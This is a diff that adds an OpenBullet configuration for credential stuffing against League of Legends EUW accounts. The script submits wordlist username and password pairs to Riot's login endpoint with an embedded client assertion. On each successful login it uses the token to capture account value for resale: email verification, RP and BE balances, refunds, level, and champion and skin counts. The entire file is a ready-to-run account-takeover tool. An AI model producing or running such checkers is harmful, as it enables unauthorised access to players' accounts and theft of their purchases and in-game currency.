@@ -1,0 +1,109 @@
+[SETTINGS]
+{
+  "Name": "LoL EUW by matt",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-24T15:12:32.6496765+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://auth.riotgames.com/token" 
+  CONTENT "client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=EUW1|<USER>&password=<PASS>&scope=openid offline_access lol ban profile email phone" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "access_token\":\"" "\",\"" -> VAR "Token" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+
+#Capture REQUEST GET "https://email-verification.riotgames.com/api/v1/account/status" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#Verified PARSE "<SOURCE>" LR "emailVerified\":" "}" -> VAR "Verified" 
+
+#Fix FUNCTION Translate 
+  KEY "true" VALUE "Yes" 
+  KEY "false" VALUE "No" 
+  "<Verified>" -> CAP "Verified" 
+
+#Capture REQUEST GET "https://acs.leagueoflegends.com/v1/stats/player_history/auth?begIndex=0&endIndex=1" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#Last_Played PARSE "<SOURCE>" LR "gameCreation\":" ",\"" -> VAR "Last Played on" 
+
+#Fix FUNCTION UnixTimeToDate "<Last Played on>" -> CAP "Last Played on" 
+
+#Capture REQUEST GET "https://store.euw1.lol.riotgames.com/storefront/v3/history/purchase?language=de_DE" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#Refunds_Available PARSE "<SOURCE>" LR "refundCreditsRemaining\":" ",\"" -> CAP "Refunds Available" 
+
+#RiotPoints PARSE "<SOURCE>" LR "rp\":" ",\"" -> CAP "RP" 
+
+#Be PARSE "<SOURCE>" LR "ip\":" ",\"" -> CAP "BE" 
+
+#Level PARSE "<SOURCE>" LR "summonerLevel\":" "}" -> CAP "Lvl" 
+
+#Capture REQUEST GET "https://euw1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION&language=en_US" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#Champions PARSE "<SOURCE>" LR "items\":{\"" "false}]" -> VAR "Champions" 
+
+#Total_champions FUNCTION CountOccurrences "itemId\":" "<Champions>" -> CAP "Total Champions" 
+
+#Capture REQUEST GET "https://euw1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION_SKIN&language=en_US" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#Skins PARSE "<SOURCE>" LR "items\":{\"" "false}]" -> VAR "Skins" 
+
+#Total_Skins FUNCTION CountOccurrences "itemId\":" "<Skins>" -> CAP "Total Skins" 
+
